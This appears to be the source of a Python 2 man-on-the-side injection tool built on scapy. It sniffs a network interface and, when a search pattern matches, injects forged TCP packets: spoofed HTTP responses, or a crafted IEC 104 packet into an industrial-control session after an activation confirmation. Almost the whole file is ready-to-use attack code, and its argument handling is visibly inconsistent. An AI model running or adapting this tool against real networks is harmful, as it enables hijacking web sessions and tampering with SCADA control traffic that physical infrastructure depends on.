#!/usr/bin/env python2

__author__ = 'Peter Maynard'
__email__ = 'pete@port22.co.uk'
__license__ = "MIT"
__version__ = "1.0.0"
__status__ = "Prototype"

try:
	# CLI Arguments and exiting.
	import optparse
	import sys, os

	# NIC and packet forging.
	import netifaces
	from scapy.all import *

	# Used to create the IEC104 response.
	from binascii import hexlify, unhexlify
except ImportError:
	print 'Failed to import necessary packages'

class MotS:
	def __init__(self, iflisten, ifinject, bpf, search, data, verbose):
		self.iflisten = iflisten
		self.ifinject = ifinject
		self.bpf = bpf
		self.search = search
		self.search_mode = False
		self.data = open(data, 'rb').read()
		self.verbose = verbose
		self.iec104_go = False
		self.iec104_go_ak = -1

		# Working with HEX, we expect an HE encoded data file.
		if self.search.startswith("0x", 0, 2):  # Check serach term starts with '0x'.
			self.search = search[2:]			# Get the Search Query.
			self.search_mode = "HEX"			# Set the search mode to HEX. 
			self.data = unhexlify(self.data) 	# Convert to binary.
		self.injected_map = [] # Prevent looping on packets.

	def check(self):
		if os.geteuid() != 0:
			print "You need root to create packets"
			return False

		print "[+] Check"
		print "  Listen  \t", self.iflisten
		print "  Inject  \t", self.ifinject
		print "  BPF   \t", self.bpf
		print "  Search  \t", self.search, self.search_mode
		if self.search_mode != "HEX":
			print "  Data:"
			print self.data
		else:
			print "  Data  \tSome hex converted to binary"
		print 
		# TODO: Proper Check.
		return True;

	def buildHTTPResponse(self, pkt):
		self.injected_map.append(pkt.id)

		ether, ip, tcp = Ether(), IP(), TCP()
		
		# Construct the Ethernet header
		ether.src, ether.dst = pkt[Ether].dst, pkt[Ether].src
		ether.type = 0x0800
		
		# Construct the IP header
		ip.ihl = pkt.ihl
		ip.tos = pkt.tos
		ip.flags = pkt.flags
		ip.frag = pkt.frag      # 'DF' : Don't Fragment
		ip.id = random.randint(5000, 50000)  # Random number btn [0, 2^16]
		ip.src, ip.dst = pkt[IP].dst, pkt[IP].src

		# Construct the TCP header
		tcp_seg_len = pkt.len - 40      # TCP segment length = total IP len - (TCP/IP hdr len)
		tcp.sport, tcp.dport = pkt.dport, pkt.sport  	
		
		# TODO Disable/Fix for HTTP
		# tcp.options = pkt.getlayer("TCP").options 
		# TODO Disable/Fix for HTTP

		tcp.dataofs = pkt.dataofs
		tcp.seq = pkt.ack
		tcp.ack = pkt.seq
		
		tcp.flags = "AF" 
		tcp.window = pkt.window
	
		# Build the packet
		forged_pkt = ether/ip/tcp/self.data

		# Force calculation of checksums.
		return forged_pkt.__class__(str(forged_pkt))

	def buildIEC104_reverse(self, pkt):
		self.injected_map.append(pkt.id)
		ether, ip, tcp = Ether(), IP(), TCP()
		
		# Construct the Ethernet header
		ether.src, ether.dst = pkt[Ether].dst, pkt[Ether].src  
		ether.type = 0x0800
		
		# Construct the IP header
		ip.ihl = pkt.ihl
		ip.tos = pkt.tos
		ip.flags = pkt.flags
		ip.frag = pkt.frag
		ip.id = random.randint(5000, 50000)  
		ip.src, ip.dst = pkt[IP].dst, pkt[IP].src  		

		# Construct the TCP header
		tcp_seg_len = pkt.len - 40      # TCP segment length = total IP len - (TCP/IP hdr len)
		tcp.sport, tcp.dport = pkt.dport, pkt.sport     
		tcp.options = pkt.getlayer("TCP").options 
		tcp.dataofs = pkt.dataofs
		tcp.seq = pkt.ack
		tcp.ack = pkt.seq
		tcp.flags = "PA"
		tcp.window = pkt.window
		
		# Build and return the entire packet
		forged_pkt = ether/ip/tcp/self.data
		# Force calculation of checksums.
		return forged_pkt.__class__(str(forged_pkt))

	def HTTPInject(self, pkt):
		pktstr = str(pkt[TCP].payload)
		if self.search in pktstr and pkt.id not in self.injected_map:
			forged_pkt = self.buildHTTPResponse(pkt)

			if self.verbose: 
				forged_pkt.show()

			sendp(forged_pkt, verbose=self.verbose, iface=self.ifinject)
			print "[-] Injected packet ID", forged_pkt.id

	def IEC104Inject(self, pkt):
		pktstr = hexlify(str(pkt[TCP].payload))

		if self.search in pktstr and pkt.id not in self.injected_map:
			print "[+] Seen ActCon from controlled station"
			self.iec104_go = True
			self.iec104_go_ak = pkt[TCP].ack

		if self.iec104_go and pkt[TCP].seq == self.iec104_go_ak:
			forged_pkt = self.buildIEC104_reverse(pkt)

			if self.verbose: 
				forged_pkt.show()

			sendp(forged_pkt, verbose=self.verbose, iface=self.ifinject)
			print "[-] Injected packet ID", forged_pkt.id ,"shuting down."
			sys.exit(0) 

	def injection(self, pkt):
		if self.search_mode:
			self.IEC104Inject(pkt)
		else: 
			self.HTTPInject(pkt)
		
		print pkt[IP].src, "\t->", pkt[IP].dst
		
	def run(self):
		print "[-] Sniffing on:\t", self.iflisten, "\n[-] Injecting on:\t", self.ifinject
		sniff(iface=self.iflisten, store=0, filter="tcp and " + self.bpf, prn=lambda x: self.injection(x))

if __name__ == '__main__':
	p = optparse.OptionParser(usage="pject.py -l <interface> [-i <interface>] -b <bpf> -r <search> -d <data> [--verbose]", version=1)
	p.add_option("-l", "--interface-listen", dest="int_listen", action="store_true", 
				help="interface of network device to listen on")
	p.add_option("-i", "--interface-inject", dest="int_inject", action="store_true", 
				help="interface of network device to inject on")
	p.add_option("-b", "--filter", dest="bpf", action="store_true", 
				help="BPF filter that specifies a subset of the traffic to be monitored")
	p.add_option("-r", "--search", dest="search", action="store_true", 
				help="regular expression to match the request packets for being spoofed")
	p.add_option("-d", "--datafile", dest="data", action="store_true",
				help="raw data to be used as TCP payload of the spoofed response")
	p.add_option("-v", "--verbose", default=False, dest="verbose", action="store_true",
				help="verbose output")
	try:
		(options, args) = p.parse_args()
		if len(args) == 4:
			print "Check arguments!\n-l ens8 -i ens3 -b 'host 10.50.50.97' -r 'GET /' -d payload/http.dat"
			print "Check arguments!\n-l ens8 -i ens3 -b 'host 10.50.50.97' -r '0xFF00FF' -d payload/iec104.dat"
			sys.exit(1)
	except:
		print "Something went wrong!!"
		sys.exit(1)

	if not os.path.isfile(args[4]):
		print "-d --datafile is not a file!"
		sys.exit(1)

	mots = MotS(args[0], args[1], args[2], args[3], args[4], options.verbose)

	# Check all the options are okay.
	if mots.check() == False:
		print "Exiting"
		sys.exit(1)

	# Run the attack.
	mots.run()
